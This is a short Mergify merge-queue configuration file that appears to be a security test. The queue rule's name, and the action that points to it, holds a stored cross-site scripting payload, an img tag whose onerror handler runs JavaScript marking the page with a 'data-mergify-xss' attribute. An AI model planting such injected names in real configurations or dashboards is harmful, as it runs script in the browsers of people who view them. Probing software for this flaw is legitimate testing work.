queue_rules:
  - name: '<img src=x onerror="document.body.setAttribute(`data-mergify-xss`,`queue-rule`)" />'
    queue_conditions:
      - check-success=lab-ci
    merge_conditions:
      - check-success=lab-ci
    merge_method: squash

pull_request_rules:
  - name: queue labeled pull requests
    conditions:
      - label=merge-queue
    actions:
      queue:
        name: '<img src=x onerror="document.body.setAttribute(`data-mergify-xss`,`queue-rule`)" />'
